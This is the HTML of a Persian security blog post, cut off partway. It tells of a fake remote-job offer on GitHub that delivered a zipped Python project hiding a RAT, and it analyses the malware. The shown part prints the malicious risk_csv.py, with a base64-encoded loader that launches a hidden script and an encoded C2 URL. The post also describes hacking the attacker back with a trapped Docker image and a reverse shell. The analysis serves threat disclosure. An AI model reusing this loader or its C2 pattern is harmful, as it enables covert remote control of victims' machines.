@@ -1,0 +1,970 @@
+<!doctype html><html lang=fa dir=rtl><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="در این مطلب، ماجرای یک حمله با پیشنهاد کار جعلی را تعریف می\u200cکنیم که در یک سناریوی «شکارچیِ شکار شده»، به تحلیل بدافزار مهاجم و هک شدن خود او ختم شد."><title>عملیات معکوس شکارچیِ شکار شده</title><link rel=canonical href=https://fa.miladbr.uk/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/><link rel=stylesheet href=/scss/style.min.833d6eed45de56f48306bf57268d5b8cdfc8a60e8e7bdc99810464fcd033f7c6.css><meta property='og:title' content="عملیات معکوس شکارچیِ شکار شده"><meta property='og:description' content="در این مطلب، ماجرای یک حمله با پیشنهاد کار جعلی را تعریف می\u200cکنیم که در یک سناریوی «شکارچیِ شکار شده»، به تحلیل بدافزار مهاجم و هک شدن خود او ختم شد."><meta property='og:url' content='https://fa.miladbr.uk/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/'><meta property='og:site_name' content="Milad's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Threat_Hunting'><meta property='article:published_time' content='2025-08-15T03:02:00+00:00'><meta property='article:modified_time' content='2025-08-15T03:02:00+00:00'><meta property='og:image' content='https://fa.miladbr.uk/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/cover.png'><meta name=twitter:title content="عملیات معکوس شکارچیِ شکار شده"><meta name=twitter:description content="در این مطلب، ماجرای یک حمله با پیشنهاد کار جعلی را تعریف می\u200cکنیم که در یک سناریوی «شکارچیِ شکار شده»، به تحلیل بدافزار مهاجم و هک شدن خود او ختم شد."><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://fa.miladbr.uk/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/cover.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky compact"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=منو>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_32fff00196f9b3ea.png width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Milad's blog</a></h1><h2 class=site-description>تحلیل‌ها، نکته‌ها و نوشته‌های من درباره امنیت اطلاعات</h2></div></header><ol class=menu-social><li><a href=https://github.com/Miladbr target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://linkedin.com/in/miladbr/ target=_blank title=LinkedIn rel=me><svg class="icon icon-tabler icon-tabler-brand-linkedin" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M8 11v5"/><path d="M8 8h.01"/><path d="M16 16v-3a2 2 0 00-4 0v3"/></svg></a></li><li><a href=https://x.com/milad_bahari target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>حالت شب</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">فهرست</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#شروع-ماجرا><strong>شروع ماجرا</strong></a></li><li><a href=#بررسی-اولیه><strong>بررسی اولیه</strong></a></li><li><a href=#تحلیل-اسکریپت-مخرب><strong>تحلیل اسکریپت مخرب</strong></a><ol><li><a href=#ثابت-ها-و-آماده-سازی><strong>ثابت ها و آماده سازی</strong></a></li><li><a href=#توابع-رمزنگاری-و-کمکی><strong>توابع رمزنگاری و کمکی</strong></a></li><li><a href=#لایهی-انتقال><strong>لایه‌ی انتقال</strong></a></li><li><a href=#ساخت-پکت-برای-ارتباط-با-c2><strong>ساخت پکت برای ارتباط با c2</strong></a></li><li><a href=#حلقهی-فرماندهی-و-کنترل-c2-loop><strong>حلقه‌ی فرماندهی و کنترل (C2 Loop)</strong></a></li><li><a href=#جمع-بندی><strong>جمع بندی</strong></a></li></ol></li><li><a href=#بازی-برعکس-فریب-مهاجم-با-dockerfile><strong>بازی برعکس: فریب مهاجم با Dockerfile</strong></a></li><li><a href=#ادامه-ماجرا-نقشه-ی-جدید-مهاجم><strong>ادامه ماجرا: نقشه ی جدید مهاجم</strong></a></li><li><a href=#جمع-بندی-1><strong>جمع بندی</strong></a></li><li><a href=#شاخص-های-تهدید-iocs><strong>شاخص های تهدید (IOCs)</strong></a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/><img src=/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/cover_hu_73575b801c5f6bf8.png srcset="/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/cover_hu_73575b801c5f6bf8.png 800w, /p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/cover_hu_cc81b21582d4c146.png 1600w" width=800 height=437 loading=lazy alt="Featured image of post عملیات معکوس شکارچیِ شکار شده"></a></div><div class=article-details><header class=article-category><a href=/categories/security/>Security</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/>عملیات معکوس شکارچیِ شکار شده</a></h2><h3 class=article-subtitle>در این مطلب، ماجرای یک حمله با پیشنهاد کار جعلی را تعریف می‌کنیم که در یک سناریوی «شکارچیِ شکار شده»، به تحلیل بدافزار مهاجم و هک شدن خود او ختم شد.</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2025-08-15T03:02:00Z>اوت 15, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>مطالعه در 20 دقیقه</time></div></footer></div></header><section class=article-content><div dir=rtl><p>می‌خوام درباره‌ی یه الگوی حمله حرف بزنم که این روزها واقعا مد شده؛ به خصوص علیه شرکت‌ها و برنامه‌نویس‌های کشورهایی مثل ایران. به خاطر تحریم‌ها و افت ارزش پول ملی، خیلی‌ها دنبال کار ریموت و حقوق دلاری ان؛ همین باعث میشه بعضی‌ها جوگیر شن و بیفتن تو دام اتکرهایی که نقش «کارفرمای خارجی» رو بازی می‌کنن: «پروژه کوچیکه، پول خوب می‌دیم، فقط یه پروژه/اسکریپت ساده…» و دقیقاً همون «ساده» تله ست.</p><p>ما مطلع هستیم که کارمندهای شرکت‌های بزرگ داخلی هم اخیراً قربانی این روش شدن. اخیرا یه نمونه برای ما رخ داد که به یه سناریوی «شکارچیِ شکار شده» تبدیل شد. یکی از همکارهامون با یه پیشنهاد کار جعلی توی گیت‌هاب مواجه شد که پروژه حاوی یه RAT پایتونی بود؛ اما به جای افتادن توی دام مهاجم، بدافزارش رو تحلیل کردیم و مهاجم رو فریب دادیم تا یه ایمیج تله‌گذاری شده رو اجرا کنه. این کار به ما یه reverse shell روی سیستم اون داد.</p><p>در ادامه، داستان کامل این ماجرا رو شرح می‌دم؛ از جمله حرکت بعدی اون، یعنی تلاش ناموفق برای فیشینگ با استفاده از یه لینک جعلی گوگل میت.</p><h2 id=شروع-ماجرا><strong>شروع ماجرا</strong></h2><p>یکی از همکارام، توی گیت‌هاب پیامی از یه فرد ناشناس دریافت کرد. متن پیام دقیقا این بود:</p><div dir=ltr><blockquote><p>I’m currently working on a startup project, and I’ll be sending you a detailed document about it as soon as quickly within this week so you can understand the overall plan and requirements.</p><p>In the meantime, I have a small Python-based analysis tool that’s part of our development process. Would it be possible for you to create a Docker build for this tool and provide the resulting image? Also, could you let me know roughly how long such a task might take and what budget I should prepare for it?</p><p>We expect to have quite a number of similar small projects in the future, so knowing the estimate for this one will help me plan the total budget for all upcoming work.</p></blockquote></div>آدرس گیتهاب این فرد مشکوک:<dir dir=ltr><p><a class=link href=https://github.com/HarryKingWork target=_blank rel=noopener>https://github.com/HarryKingWork</a></p></div><p><img src=/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/harry1.webp width=1024 height=625 srcset="/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/harry1_hu_8929cc38e935d29e.webp 480w, /p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/harry1_hu_6d8fdf391abec44d.webp 1024w" loading=lazy alt="پروفایل مهاجم در گیتهاب" class=gallery-image data-flex-grow=163 data-flex-basis=393px></p><p>پروفایل مهاجم در گیت‌هاب</p><p>خب این پیام خیلی بودار بود و واضح بود که کلاهبرداریه. آخه کی میاد یهو توی گیت‌هاب پیام بده که بیا من پروژه دارم! خوشبختانه همکارم تجربه کافی رو داشت و سریع متوجه شد این داستان بوی خطر میده. هیچ همکاری باهاش نکرد و اون فرد رو هم بلاک کرد. بعدش ماجرا رو به من منتقل کرد تا بیشتر بررسی کنم.</p><h2 id=بررسی-اولیه><strong>بررسی اولیه</strong></h2><p>اول مطمئن شدم که فرد دیگری توی شرکت با اون در تماس نبوده و موضوع بیشتر شخصیه تا سازمانی. اما از سر کنجکاوی، تصمیم گرفتم یکمی بیشتر جلو برم. به آیدی تلگرام مهاجم که از همکارم گرفته بودم پیام دادم:<br>«خب چی شد؟ قرار بود پروژه بدی، من منتظرم!»</p><p>طرف گیج شده بود، یادش نمیومد قبلا با من صحبت کرده، ولی کم‌کم جا افتاد و دوباره شروع کرد از پروژه DevOps گفتن. منم خودمو مشتاق نشون دادم که فقط می خوام سریع کار رو بگیرم.</p><p><img src=/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/harry2.webp width=1024 height=1576 srcset="/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/harry2_hu_ac2dbbd189196360.webp 480w, /p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/harry2_hu_44697954afc15ee5.webp 1024w" loading=lazy class=gallery-image data-flex-grow=64 data-flex-basis=155px></p><p>بعدش برام یه فایل زیپ رمزدار &ldquo;chartflow_analysis_deploy.zip&rdquo; فرستاد. </p><p><img src=/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/harry3.webp width=1024 height=1314 srcset="/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/harry3_hu_ef4221a55f90d2b6.webp 480w, /p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/harry3_hu_83345d12ecdf5d43.webp 1024w" loading=lazy class=gallery-image data-flex-grow=77 data-flex-basis=187px></p><p>سریع فایل رو بردم توی sandbox بازش کردم و شروع کردم به بررسی کردن.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>-&gt; % ls -R
+</span></span><span class=line><span class=cl>.:
+</span></span><span class=line><span class=cl>Dockerfile  data  main.py  requirements.txt  src
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>./data:
+</span></span><span class=line><span class=cl>Price100.txt  Price102.txt  Price104.txt  Price106.txt
+</span></span><span class=line><span class=cl>Price101.txt  Price103.txt  Price105.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>./src:
+</span></span><span class=line><span class=cl>__pycache__   csvutils.py       risk_csv.py        test_risk.py
+</span></span><span class=line><span class=cl>calc_data.py  requirements.txt  test_data_calc.py
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>./src/__pycache__:
+</span></span><span class=line><span class=cl>calc_data.cpython-39.pyc  risk_calculation.cpython-39.pyc
+</span></span><span class=line><span class=cl>csvutils.cpython-39.pyc   risk_csv.cpython-39.pyc
+</span></span></code></pre></td></tr></table></div></div><p>اینجور وقت ها اولین چیزی که دنبالش می گردم یه پیلود رمز شده یا مثلا base64 انکود شده هست. خیلی زود سرنخ اولیه توی مسیر 
+<strong>chartflow_analysis/src/risk-csv.py/.</strong>
+پیدا شد که مشخصا رفتار یه بدافزار رو داشت.</p><h2 id=تحلیل-اسکریپت-مخرب><strong>تحلیل اسکریپت مخرب</strong></h2><p>خب بریم سراغ تحلیل. اول یه نگاه به کد risk_csv.py بندازیم:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ctypes</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ctypes</span> <span class=k>as</span> <span class=nn>ct</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os.path</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>platform</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>wintypes</span> <span class=k>as</span> <span class=n>w</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sys</span> <span class=kn>import</span> <span class=n>platform</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>rdata2</span> <span class=o>=</span> <span class=s2>&#34;ZGVmIGV4dF9yZXNvdXJjZShmaWxlLCBzaG93KToKICAgIHB5dGhvbl9wYXRoID0gc3lzLmJhc2VfZXhlY19wcmVmaXggKyAiXFxweXRob253LmV4ZSIKICAgIHNoZWxsMzIgPSBjdC5XaW5ETEwoJ3NoZWxsMzInKQogICAgc2hlbGwzMi5TaGVsbEV4ZWN1dGVBLmFyZ3R5cGVzID0gdy5IV05ELCB3LkxQQ1NUUiwgdy5MUENTVFIsIHcuTFBDU1RSLCB3LkxQQ1NUUiwgdy5JTlQKICAgIHNoZWxsMzIuU2hlbGxFeGVjdXRlQS5yZXN0eXBlID0gdy5ISU5TVEFOQ0UKICAgIGlmKG9zLnBhdGguZXhpc3RzKHB5dGhvbl9wYXRoKT09VHJ1ZSk6CiAgICAJc2hlbGwzMi5TaGVsbEV4ZWN1dGVBKE5vbmUsIGInb3BlbicsIHB5dGhvbl9wYXRoLmVuY29kZSgpLGZpbGUsIE5vbmUsIHNob3cpCiAgICBlbHNlOgogICAgICAgIHNoZWxsMzIuU2hlbGxFeGVjdXRlQShOb25lLCBiJ29wZW4nLCBiJ3B5LmV4ZScsZmlsZSwgTm9uZSwgc2hvdykKCmRlZiBydW5fY29tbWFuZChjb21tYW5kKToKICAgIG91dHB1dCA9ICIiCiAgICBlcnJvciA9ICIiCiAgICB3aXRoIG9zLnBvcGVuKGNvbW1hbmQpIGFzIHByb2Nlc3M6CiAgICAgICAgb3V0cHV0ID0gcHJvY2Vzcy5yZWFkKCkKICAgICAgICByZXR1cm5fY29kZSA9IHByb2Nlc3MuY2xvc2UoKQogICAgaWYgcmV0dXJuX2NvZGUgaXMgbm90IE5vbmUgYW5kIHJldHVybl9jb2RlICE9IDA6CiAgICAgICAgd2l0aCBvcy5wb3Blbihjb21tYW5kICsgIiAyPiYxIikgYXMgcHJvY2VzczoKICAgICAgICAgICAgZXJyb3IgPSBwcm9jZXNzLnJlYWQoKQogICAgZWxzZToKICAgICAgICBlcnJvciA9ICIiCiAgICByZXR1cm4KCmlmIHBsYXRmb3JtID09ICJ3aW4zMiI6CiAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguZGlybmFtZShfX2ZpbGVfXykgKyJcXHRlc3Rfcmlzay5weSIKICAgIHNjcmlwdF9wYXRoID0gJyInICsgc2NyaXB0X3BhdGggKyAnIicKICAgIGV4dF9yZXNvdXJjZShzY3JpcHRfcGF0aC5lbmNvZGUoKSwgMCkKZWxzZToKICAgIHNjcmlwdF9wYXRoID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGgucmVhbHBhdGgoX19maWxlX18pKQogICAgc2NyaXB0X3BhdGggPSAicHl0aG9uMyAiICsgJyInICsgc2NyaXB0X3BhdGggKyAiL3Rlc3Rfcmlzay5weSIgKyAnIicgKyAiID4gL2Rldi9udWxsIDI+JjEgJiIKICAgIHJ1bl9jb21tYW5kKHNjcmlwdF9wYXRoKQ==&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test_read</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=n>csv_data</span> <span class=o>=</span> <span class=n>csv</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s2>&#34;../data/Price101.txt&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=bp>self</span><span class=o>.</span><span class=n>assertEquals</span><span class=p>(</span><span class=mi>473</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>csv_data</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>	<span class=n>first_price</span> <span class=o>=</span> <span class=n>csv_data</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>	<span class=n>last_price</span> <span class=o>=</span> <span class=n>csv_data</span><span class=p>[</span><span class=mi>472</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>	<span class=bp>self</span><span class=o>.</span><span class=n>assertEquals</span><span class=p>(</span><span class=mf>58.209999</span><span class=p>,</span> <span class=n>first_price</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=bp>self</span><span class=o>.</span><span class=n>assertEquals</span><span class=p>(</span><span class=mf>66.510002</span><span class=p>,</span> <span class=n>last_price</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>jestinc</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>	<span class=n>dalc</span> <span class=o>=</span> <span class=s2>&#34;YzpcdXNlcnNccHVibGljXEljb25DYWNoZS5kYXQ=&#34;</span>
+</span></span><span class=line><span class=cl>	<span class=n>ddapl</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>dalc</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>jww</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>ddapl</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=n>jww</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;aHR0cDovL25ldHVwZGF0ZXMuaW5mby9ib2FyZC9ib2FyZC5waHA=&#34;</span><span class=p>)</span>
